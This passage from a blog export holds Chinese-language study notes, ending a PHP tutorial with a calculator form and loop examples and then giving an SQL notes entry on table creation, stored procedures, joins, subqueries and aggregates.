$num2==<span class="number">0</span>)</span><br><span class="line">		&#123;$error.=<span class="string">"被除数不能为0&lt;br&gt;"</span>;&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;table align=<span class="string">"center"</span> border =<span class="string">"1"</span> width=<span class="string">"500"</span>&gt;</span><br><span class="line">			&lt;caption&gt;&lt;h1&gt;计算器&lt;/h1&gt;&lt;/caption&gt;</span><br><span class="line">			&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">			&lt;tr&gt; </span><br><span class="line">				&lt;td&gt;</span><br><span class="line">					<span class="meta">&lt;?php</span> <span class="comment">//将用户输入的数据计算后显示再输入表单中<span class="meta">?&gt;</span></span></span><br><span class="line">					&lt;input type=<span class="string">"text"</span> size=<span class="string">"5"</span> name=<span class="string">"num1"</span> value=<span class="string">"&lt;?php echo $num1;?&gt;"</span>&gt;</span><br><span class="line">				&lt;/td&gt;</span><br><span class="line">				&lt;td&gt;</span><br><span class="line">					&lt;select name=<span class="string">"operator"</span>&gt;</span><br><span class="line">						&lt;option value=<span class="string">"+"</span> <span class="meta">&lt;?php</span> <span class="keyword">if</span>($operator==<span class="string">"+"</span>) <span class="keyword">echo</span> <span class="string">"selected"</span><span class="meta">?&gt;</span>&gt;+ &lt;/option&gt;</span><br><span class="line">						&lt;option value=<span class="string">"-"</span> <span class="meta">&lt;?php</span> <span class="keyword">if</span>($operator==<span class="string">"-"</span>) <span class="keyword">echo</span> <span class="string">"selected"</span><span class="meta">?&gt;</span>&gt;- &lt;/option&gt;</span><br><span class="line">						&lt;option value=<span class="string">"*"</span> <span class="meta">&lt;?php</span> <span class="keyword">if</span>($operator==<span class="string">"*"</span>) <span class="keyword">echo</span> <span class="string">"selected"</span><span class="meta">?&gt;</span>&gt;* &lt;/option&gt;</span><br><span class="line">						&lt;option value=<span class="string">"/"</span> <span class="meta">&lt;?php</span> <span class="keyword">if</span>($operator==<span class="string">"/"</span>) <span class="keyword">echo</span> <span class="string">"selected"</span><span class="meta">?&gt;</span>&gt;/ &lt;/option&gt;</span><br><span class="line">						&lt;option value=<span class="string">"%"</span> <span class="meta">&lt;?php</span> <span class="keyword">if</span>($operator==<span class="string">"%"</span>) <span class="keyword">echo</span> <span class="string">"selected"</span><span class="meta">?&gt;</span>&gt;% &lt;/option&gt;</span><br><span class="line">					&lt;/select&gt;</span><br><span class="line">				&lt;/td&gt;</span><br><span class="line">				&lt;td&gt;</span><br><span class="line">					&lt;input type=<span class="string">"text"</span> size=<span class="string">"5"</span> name=<span class="string">"num2"</span> value=<span class="string">"&lt;?php echo $num2;?&gt;"</span>&gt;	</span><br><span class="line">				&lt;/td&gt;</span><br><span class="line">				&lt;td&gt;</span><br><span class="line">					&lt;input type=<span class="string">"submit"</span> name=<span class="string">"sub"</span> value=<span class="string">"计算"</span>&gt;</span><br><span class="line">				&lt;/td&gt;</span><br><span class="line">			&lt;/tr&gt;</span><br><span class="line">			<span class="meta">&lt;?php</span></span><br><span class="line">				<span class="comment">//使用单路分支，用户有提交操作才执行结果				</span></span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"sub"</span>]))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">'&lt;tr&gt;&lt;td colspan="5" align="center"&gt;'</span>;</span><br><span class="line">					<span class="comment">//双路分支，正确输入输出结果，有错误则输出错误信息</span></span><br><span class="line">					<span class="keyword">if</span>(<span class="keyword">empty</span>($error))&#123;</span><br><span class="line">						$sum=<span class="number">0</span>;</span><br><span class="line">						<span class="keyword">switch</span>($operator)&#123;</span><br><span class="line">							<span class="keyword">case</span> <span class="string">"+"</span>:</span><br><span class="line">								$sum=$num1+$num2;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							<span class="keyword">case</span> <span class="string">"-"</span>:</span><br><span class="line">								$sum=$num1-$num2;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							</span><br><span class="line">							<span class="keyword">case</span> <span class="string">"*"</span>:</span><br><span class="line">								$sum=$num1*$num2;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							<span class="keyword">case</span> <span class="string">"/"</span>:</span><br><span class="line">								$sum=$num1/$num2;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							<span class="keyword">case</span> <span class="string">"%"</span>:</span><br><span class="line">								$sum=$num1%$num2;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">"结果：&#123;$num1&#125;&#123;$operator&#125;&#123;$num2&#125;=&#123;$sum&#125;&lt;br&gt;"</span>;</span><br><span class="line">					&#125;</span><br><span class="line">						<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"$error&lt;br&gt;"</span>;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">"&lt;/td&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="meta">?&gt;</span></span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/table&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/25/php/php2/image-20200605112117596.png"  alt="image-20200605112117596"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/25/php/php2/image-20200605112203339.png"  alt="image-20200605112203339"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/25/php/php2/image-20200605112222004.png"  alt="image-20200605112222004"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;&lt;title&gt;使用<span class="keyword">while</span>循环嵌套输出表格&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;table align =<span class="string">"center"</span> border=<span class="string">"1"</span> width=<span class="number">600</span>&gt;</span><br><span class="line">			&lt;caption&gt;&lt;h1&gt;使用<span class="keyword">while</span>循环嵌套输出表格&lt;/h1&gt;&lt;/caption&gt;</span><br><span class="line">			<span class="meta">&lt;?php</span></span><br><span class="line">				$out = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">while</span>($out &lt; <span class="number">10</span>)</span><br><span class="line">				&#123;<span class="comment">//指定外层循环</span></span><br><span class="line">					$bgcolor = $out%<span class="number">2</span> ==<span class="number">0</span> ? <span class="string">"#FFFFFF"</span> : <span class="string">"#DDDDDD"</span>;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"&lt;tr bgcolor="</span>.$bgcolor.<span class="string">"&gt;"</span>;</span><br><span class="line">					$in=<span class="number">0</span>;</span><br><span class="line">					<span class="keyword">while</span>($in&lt;<span class="number">10</span>)</span><br><span class="line">					&#123;<span class="comment">//指定内层循环</span></span><br><span class="line">						<span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span>.($out*<span class="number">10</span>+$in).<span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">						$in++;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">					$out++;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="meta">?&gt;</span></span><br><span class="line">		&lt;/table&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/25/php/php2/image-20200605142007126.png"  alt="image-20200605142007126" style="zoom:67%;">

<h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><p>break 1; //退出一层</p>
<p>break 2;//退出两层</p>
<h2 id="exit语句"><a href="#exit语句" class="headerlink" title="exit语句"></a>exit语句</h2><p>直接退出当前脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>....</span><br><span class="line">    <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>

<h2 id="goto"><a href="#goto" class="headerlink" title="goto"></a>goto</h2><p>同C++</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">label:</span><br><span class="line">	.....</span><br><span class="line">	</span><br><span class="line">	goto label;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>sql语言</title>
    <url>/2020/05/21/%E6%95%B0%E6%8D%AE%E5%BA%93/sql/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>创建数据库</li>
<li>插入数据存储过程代码</li>
</ul>
<a id="more"></a>

<h1 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h1><p>创建work1.sql文件</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`innodb`</span>(</span><br><span class="line">	<span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line">	<span class="string">`data`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`myisam`</span>(</span><br><span class="line">	<span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line">	<span class="string">`data`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">ENGINE</span>=myisam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> myinsert(a <span class="built_in">int</span>)</span><br><span class="line">	<span class="keyword">begin</span></span><br><span class="line">		<span class="keyword">declare</span> i <span class="built_in">int</span> <span class="keyword">default</span> <span class="number">1</span>;</span><br><span class="line">		repeat</span><br><span class="line">			<span class="keyword">insert</span> <span class="keyword">into</span> <span class="string">`innodb`</span>  <span class="keyword">VALUES</span>(i,i);</span><br><span class="line">			<span class="keyword">set</span> i=i+<span class="number">1</span>;</span><br><span class="line">		until i&gt;a end repeat;</span><br><span class="line">	<span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行存储过程</span></span><br><span class="line"><span class="keyword">call</span> myinsert(<span class="number">10000</span>);</span><br><span class="line"><span class="comment">-- 删除myinsert函数</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">procedure</span> <span class="keyword">if</span> <span class="keyword">exists</span> myinsert;</span><br></pre></td></tr></table></figure>
<p>可以编写sql文件，也可在命令列界面中分步运行</p>
<p>运行之后需要刷新</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/image-20200316214043980.png"  alt="image-20200316214043980" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/1584365805(1).png"  alt="1584365805(1).png" style="zoom:35%;"></p>
<h1 id="针对数据库的操作"><a href="#针对数据库的操作" class="headerlink" title="针对数据库的操作"></a>针对数据库的操作</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看当前数据库</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> Management_System</span><br><span class="line"><span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8mb4	</span><br><span class="line"><span class="keyword">DEFAULT</span> <span class="keyword">COLLATE</span> utf8mb4_unicode_ci;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Use</span> Flight_Management_System;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 删除数据库</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> [ <span class="keyword">IF</span> <span class="keyword">EXISTS</span> ] &lt;数据库名&gt;;</span><br></pre></td></tr></table></figure>

<h1 id="针对表的操作"><a href="#针对表的操作" class="headerlink" title="针对表的操作"></a>针对表的操作</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 向表中添加数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="string">`flight`</span> <span class="keyword">values</span>(<span class="string">'CA123'</span>,<span class="string">'TSN'</span>,<span class="string">'TAO'</span>,<span class="string">'CA'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 清空表</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> [表名];</span><br></pre></td></tr></table></figure>

<h1 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> search_tickets</span><br><span class="line">    <span class="keyword">as</span></span><br><span class="line">    <span class="keyword">select</span> *</span><br><span class="line">    <span class="keyword">from</span> timetable <span class="keyword">natural</span> <span class="keyword">join</span> flight <span class="keyword">natural</span> <span class="keyword">join</span> airline</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> xxxx</span><br></pre></td></tr></table></figure>



<h1 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h1><p>当输出的属性不为主键时,可能出现重复 </p>
<h2 id="LIKE-NOT-LIKE匹配"><a href="#LIKE-NOT-LIKE匹配" class="headerlink" title="LIKE/NOT LIKE匹配"></a>LIKE/NOT LIKE匹配</h2><p>% 代表任意字符串</p>
<p>_ 代表一个字符</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">name</span></span><br><span class="line"><span class="keyword">FROM</span>	drinkers</span><br><span class="line"><span class="keyword">WHERE</span>	phone <span class="keyword">LIKE</span> <span class="string">'555%'</span>;</span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查找所有李姓员工</span></span><br><span class="line"><span class="keyword">SELECT</span>	*</span><br><span class="line"><span class="keyword">FROM</span>	employee </span><br><span class="line"><span class="keyword">WHERE</span>	empname <span class="keyword">LIKE</span> <span class="string">'李%'</span>;</span><br></pre></td></tr></table></figure>

<h2 id="NULL空值"><a href="#NULL空值" class="headerlink" title="NULL空值"></a>NULL空值</h2><p>任意字符串(%)与空值比较的结果是<code>unknown</code>,不会返回unknown结果值</p>
<p>true=1,false=0,unknown=1/2</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查找所有job非空的元组</span></span><br><span class="line"><span class="keyword">SELECT</span>	*</span><br><span class="line"><span class="keyword">FROM</span>	workson</span><br><span class="line"><span class="keyword">WHERE</span>	job <span class="keyword">LIKE</span> <span class="string">'%'</span>;	<span class="comment">-- 或者为 job IS NOT NULL</span></span><br></pre></td></tr></table></figure>
<h2 id="ORDER-BY-输出排序"><a href="#ORDER-BY-输出排序" class="headerlink" title="ORDER BY 输出排序"></a>ORDER BY 输出排序</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ORDER BY &lt;list of attributes&gt;</span><br><span class="line">ASC(升序,默认),DESC(降序)</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	enpname</span><br><span class="line"><span class="keyword">FROM</span>	employee</span><br><span class="line"><span class="keyword">WHERE</span>	deptno=<span class="string">'d2'</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> empno <span class="keyword">DESC</span>;	<span class="comment">-- 可以按照不输出的属性排序</span></span><br></pre></td></tr></table></figure>

<h2 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h2><h3 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 使用笛卡尔积连接两个表</span></span><br><span class="line"><span class="comment">-- 两个表中有同名属性,select其中一个时需要标明,不然会出现两列</span></span><br><span class="line"><span class="keyword">SELECT</span>	beer</span><br><span class="line"><span class="keyword">FROM</span>	frequents,likes </span><br><span class="line"><span class="keyword">WHERE</span>	bar=<span class="string">'Joe"s Bar'</span> <span class="keyword">AND</span>	</span><br><span class="line">		frequents.drinker = likes.drinker;</span><br><span class="line">		<span class="comment">-- 待查找的内容为'-&gt;"</span></span><br></pre></td></tr></table></figure>

<h3 id="natural-join"><a href="#natural-join" class="headerlink" title="natural join"></a>natural join</h3><p>只使用于两个表有一列相同属性</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	*</span><br><span class="line"><span class="keyword">FROM</span>	employee natrual <span class="keyword">join</span> department</span><br><span class="line"><span class="keyword">WHERE</span>	location=<span class="string">'天津'</span>;</span><br><span class="line"><span class="comment">-- 相同的两列不重复出现</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 等价</span></span><br><span class="line"><span class="keyword">SELECT</span>	*</span><br><span class="line"><span class="keyword">FROM</span>	employee,department</span><br><span class="line"><span class="keyword">WHERE</span>	department.deptno=employee.deptno <span class="keyword">and</span></span><br><span class="line">		location=<span class="string">'天津'</span>;</span><br><span class="line"><span class="comment">-- 使用and/or连接多个查询条件</span></span><br></pre></td></tr></table></figure>

<h3 id="inner-join"><a href="#inner-join" class="headerlink" title="inner join"></a>inner join</h3><p>作用与natural相同，使用与有多个相同属性，使用on进行约束</p>
<h3 id="left-right-outer-join-左-右外连接"><a href="#left-right-outer-join-左-右外连接" class="headerlink" title="left/right outer join 左/右外连接"></a>left/right outer join 左/右外连接</h3><p>(显示count=0的部分-&gt;单元内容为null)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 给出每个专业借阅的“c2”类的图书总数，没有借阅的次数显示为0（</span></span><br><span class="line"><span class="keyword">select</span> majorid,majorname,<span class="keyword">count</span>(catid) <span class="keyword">as</span> borrowcount</span><br><span class="line"><span class="keyword">from</span> student <span class="keyword">left</span> <span class="keyword">outer</span> <span class="keyword">join</span> borrow <span class="keyword">on</span> student.stuid=borrow.stuid</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">outer</span> <span class="keyword">join</span> book <span class="keyword">on</span> book.bookid=borrow.bookid</span><br><span class="line"><span class="keyword">and</span> book.catid=<span class="string">'c2'</span></span><br><span class="line"><span class="keyword">natural</span> <span class="keyword">join</span> major</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> majorid;</span><br></pre></td></tr></table></figure>

<h3 id="元组变量"><a href="#元组变量" class="headerlink" title="元组变量"></a>元组变量</h3><p>引入一个关系的两个或更多部分</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 返回制造商一致的啤酒对</span></span><br><span class="line"><span class="keyword">SELECT</span>	b1.name,b2.name</span><br><span class="line"><span class="keyword">FROM</span>	beers b1,beers b2</span><br><span class="line"><span class="keyword">WHERE</span>	b1.manf=b2.manf <span class="keyword">and</span></span><br><span class="line">		b1.name&lt;b2.name; <span class="comment">-- 避免冗余</span></span><br></pre></td></tr></table></figure>

<h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><h3 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- find bars that serve Miller at the same price Joe charges for Bud</span></span><br><span class="line"><span class="keyword">SELECT</span>	bar</span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">WHERE</span>	beer=<span class="string">'Miller'</span> <span class="keyword">and</span> price=</span><br><span class="line">			(<span class="keyword">SELECT</span>	price</span><br><span class="line">			<span class="keyword">FROM</span>	sells</span><br><span class="line">			<span class="keyword">WHERE</span>	bar=<span class="string">'Joe"s Bar'</span> <span class="keyword">and</span> beer=<span class="string">'Bud'</span>);</span><br></pre></td></tr></table></figure>

<h3 id="IN-NOT-IN操作"><a href="#IN-NOT-IN操作" class="headerlink" title="IN/NOT IN操作"></a>IN/NOT IN操作</h3><p>只能用于连接查询结果,而不能是 in+&lt;表&gt;</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	*</span><br><span class="line"><span class="keyword">FROM</span>	Beers</span><br><span class="line"><span class="keyword">WHERE</span>	<span class="keyword">name</span> <span class="keyword">IN</span> </span><br><span class="line">			(<span class="keyword">SELECT</span> beer</span><br><span class="line">			<span class="keyword">FROM</span> likes</span><br><span class="line">			<span class="keyword">WHERE</span> drinker=<span class="string">'Fred'</span>); </span><br><span class="line">			<span class="comment">-- 当子查询只有一个查询结果,in可改为=</span></span><br><span class="line"><span class="comment">-- 或写成</span></span><br><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">name</span>,manf</span><br><span class="line"><span class="keyword">FROM</span>	Beers,Likes</span><br><span class="line"><span class="keyword">WHERE</span>	drinker=<span class="string">'Fred'</span> <span class="keyword">and</span> beer=<span class="keyword">name</span>;</span><br></pre></td></tr></table></figure>

<h3 id="EXISTS"><a href="#EXISTS" class="headerlink" title="EXISTS"></a>EXISTS</h3><p>当且仅当关系非空时为真</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 不存在制造商一致的不同啤酒-&gt; 一个manf只有一个beer的beer</span></span><br><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">name</span></span><br><span class="line"><span class="keyword">FROM</span>	beers b1</span><br><span class="line"><span class="keyword">WHERE</span>	<span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">			(<span class="keyword">SELECT</span> *</span><br><span class="line">             <span class="keyword">FROM</span>	beers</span><br><span class="line">             <span class="keyword">WHERE</span>	manf = b1.manf <span class="keyword">and</span></span><br><span class="line">             		<span class="keyword">name</span> &lt;&gt; b1.name);</span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查找部门中只有一名员工的员工姓名</span></span><br><span class="line"><span class="keyword">SELECT</span>	empname</span><br><span class="line"><span class="keyword">FROM</span>	empoyee e1</span><br><span class="line"><span class="keyword">WHERE</span>	<span class="keyword">not</span> <span class="keyword">exists</span></span><br><span class="line">		(<span class="keyword">SELECT</span>	*</span><br><span class="line">         <span class="keyword">FROM</span>	employee</span><br><span class="line">         <span class="keyword">WHERE</span>	deptno=e1.deptno <span class="keyword">and</span></span><br><span class="line">        		empname&lt;&gt;e1.empname);</span><br></pre></td></tr></table></figure>

<h3 id="ANY-ALL"><a href="#ANY-ALL" class="headerlink" title="ANY/ALL"></a>ANY/ALL</h3><p>x=ANY (relation) 等于其中至少一个<br>x&gt;ANY (relation) 大于至少一个<br>relation中只有一个属性列<br>X&lt;&gt;ALL (relation) x不在relation内<br>x&gt;ALL (relation) x大于等于关系中的所有元组</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 找到售价最高的，注意是&gt;=</span></span><br><span class="line"><span class="keyword">SELECT</span>	beer</span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">WHERE</span>	price&gt;=<span class="keyword">ALL</span>(<span class="keyword">SELECT</span> price <span class="keyword">FROM</span> sells);</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 不是最低价格</span></span><br><span class="line"><span class="keyword">SELECT</span>	beer</span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">WHERE</span>	price&gt;<span class="keyword">ANY</span>(<span class="keyword">SELECT</span> price <span class="keyword">FROM</span> sells);</span><br></pre></td></tr></table></figure>


<h3 id="子表命名"><a href="#子表命名" class="headerlink" title="子表命名"></a>子表命名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 给出借阅了所有图书类别的本科生</span></span><br><span class="line"><span class="keyword">select</span> stuid,stuname</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">(<span class="keyword">select</span> stuid,<span class="keyword">count</span>(<span class="keyword">distinct</span> catid) <span class="keyword">as</span> times</span><br><span class="line"><span class="keyword">from</span> borrow <span class="keyword">natural</span> <span class="keyword">join</span> student <span class="keyword">natural</span> <span class="keyword">join</span> book</span><br><span class="line"><span class="keyword">where</span> student.degree=<span class="string">'本科生'</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> stuid) <span class="keyword">as</span> temp1 </span><br><span class="line"><span class="keyword">natural</span> <span class="keyword">join</span> student</span><br><span class="line"><span class="keyword">where</span> times=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">category</span>);</span><br><span class="line"><span class="comment">-- -----------------</span></span><br><span class="line"><span class="keyword">select</span> stuid, stuname </span><br><span class="line"><span class="keyword">from</span> student </span><br><span class="line"><span class="keyword">where</span> degree = <span class="string">'本科生'</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="keyword">exists</span>(</span><br><span class="line">	<span class="keyword">select</span> catid </span><br><span class="line">    <span class="keyword">from</span> <span class="keyword">category</span> </span><br><span class="line">    <span class="keyword">where</span> catid <span class="keyword">not</span> <span class="keyword">in</span>(</span><br><span class="line">		<span class="keyword">select</span> catid <span class="keyword">from</span> book, borrow</span><br><span class="line">		<span class="keyword">where</span> book.bookid = borrow.bookid <span class="keyword">and</span> borrow.stuid = student.stuid</span><br><span class="line">	);</span><br></pre></td></tr></table></figure>


<h2 id="Union-Intersecion-Difference"><a href="#Union-Intersecion-Difference" class="headerlink" title="Union, Intersecion, Difference"></a>Union, Intersecion, Difference</h2><p>intersect：交集<br>union：并集<br>except：A-B</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 两个集合的交集,要求两个表具有相同的属性列</span></span><br><span class="line">(<span class="keyword">SELECT</span>	*	<span class="keyword">FROM</span>	likes) <span class="comment">-- likes(drinker,beer)</span></span><br><span class="line">	<span class="keyword">INTERSECT</span></span><br><span class="line">(<span class="keyword">SELECT</span>	drinker,beer</span><br><span class="line"><span class="keyword">FROM</span>	sells,frequents</span><br><span class="line"><span class="keyword">WHERE</span>	frequents.bar=sells.bar);</span><br></pre></td></tr></table></figure>


<h2 id="Set-集合-Bag-包"><a href="#Set-集合-Bag-包" class="headerlink" title="Set(集合)/Bag(包)"></a>Set(集合)/Bag(包)</h2><p>普通的select-from-where是包-&gt;可重复<br>union\intersection\difference是集合-&gt;不可重复</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">DISTINCT</span> price	<span class="comment">-- 强制转化为不可重复</span></span><br><span class="line"><span class="keyword">FROM</span>	sells;</span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(...) UNION ALL (...);	<span class="comment">-- 可重复</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- eg. empname有七条</span></span><br><span class="line"><span class="keyword">SELECT</span>	e1.empname</span><br><span class="line"><span class="keyword">FROM</span>	empname e1,empname e2; <span class="comment">-- 返回49条</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">DISTINCT</span> e1.empname</span><br><span class="line"><span class="keyword">FROM</span>	empname e1,empname e2; <span class="comment">-- 返回7条</span></span><br></pre></td></tr></table></figure>

<h2 id="Aggregations聚合操作"><a href="#Aggregations聚合操作" class="headerlink" title="Aggregations聚合操作"></a>Aggregations聚合操作</h2><p>sum、avg、min、max、count、count(*)</p>
<p>聚合不可以嵌套使用</p>
<h3 id="AVG"><a href="#AVG" class="headerlink" title="AVG"></a>AVG</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">AVG</span>(price)</span><br><span class="line"><span class="keyword">FROM</span>	sells;</span><br></pre></td></tr></table></figure>
<h3 id="COUNT"><a href="#COUNT" class="headerlink" title="COUNT"></a>COUNT</h3><p>count忽略null，计算重复<br>count(*)不忽略null</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>	<span class="keyword">COUNT</span>(<span class="keyword">DISTINCT</span> price) <span class="comment">-- 有多少种不同的售价</span></span><br><span class="line"><span class="keyword">FROM</span>	sells</span><br><span class="line"><span class="keyword">WHERE</span>	beer=<span class="string">'Bud'</span>;</span><br></pre></td></tr></table></figure>


